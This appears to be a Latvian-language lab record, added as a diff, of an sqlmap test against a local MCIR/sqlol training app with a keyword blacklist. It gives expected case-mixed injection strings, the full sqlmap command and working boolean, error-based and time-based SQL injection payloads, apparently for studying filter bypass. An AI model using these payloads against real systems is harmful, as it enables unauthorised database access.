@@ -1,0 +1,34 @@
+=================================================================================
+1. Īpašība: atslēgvārdi “union”, “select”, “where”, “and”, “or”, “--" un "#" ir melnajā sarakstā
+2. Nepiciešams tampering: ne obligāti, var norādīt --tampering=randomcase, bet tāpat viss tiek atklāts
+3. Sagaidāmais rezultāts: 
+3.1. boolean-based: ?inject_string=test' Or '1'='1
+3.2. error-based: ?inject_string=test'
+3.3. time-based: ?inject_string=test' Or sleep(1) -%23- -
+3.4. union: ?inject_string=test' uNiOn sElEcT 1-%23- -
+4. Reālais rezultāts: redzams zemāk
+5. Vidējais risinājuma ilgums: 17270133 nanosekundes
+6. Palaistā komanda
+sqlmap -u "http://localhost/MCIR/sqlol/select.php?sanitization_level=low&sanitization_type=keyword&sanitization_params=union%2Cselect%2Cwhere%2Cand%2Cor%2C--%2C%23&query_results=all_rows&error_level=verbose&show_query=on&inject_string=test&location=where_string&submit=Inject%21" -p inject_string --risk=3 --level=5
+
+7. Jautājumi, kurus uzdeva SQLMap:
+7.1. it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+7.2. GET parameters 'inject_string' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+=================================================================================
+sqlmap identified the following injection point(s) with a total of 542 HTTP(s) requests:
+---
+Parameter: inject_string (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: sanitization_level=low&sanitization_type=keyword&sanitization_params=union,select,where,and,or,--,#&query_results=all_rows&error_level=verbose&show_query=on&inject_string=-1734' OR 4820=4820 AND 'fZpI'='fZpI&location=where_string&submit=Inject!
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: sanitization_level=low&sanitization_type=keyword&sanitization_params=union,select,where,and,or,--,#&query_results=all_rows&error_level=verbose&show_query=on&inject_string=test' AND GTID_SUBSET(CONCAT(0x7171716b71,(SELECT (ELT(5012=5012,1))),0x71786a7a71),5012) AND 'vTbA'='vTbA&location=where_string&submit=Inject!
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: sanitization_level=low&sanitization_type=keyword&sanitization_params=union,select,where,and,or,--,#&query_results=all_rows&error_level=verbose&show_query=on&inject_string=test' AND (SELECT 9608 FROM (SELECT(SLEEP(5)))Eakx) AND 'nQRG'='nQRG&location=where_string&submit=Inject!
+---
+web application technology: Apache 2.4.38, PHP 5.6.40
+back-end DBMS: MySQL >= 5.6
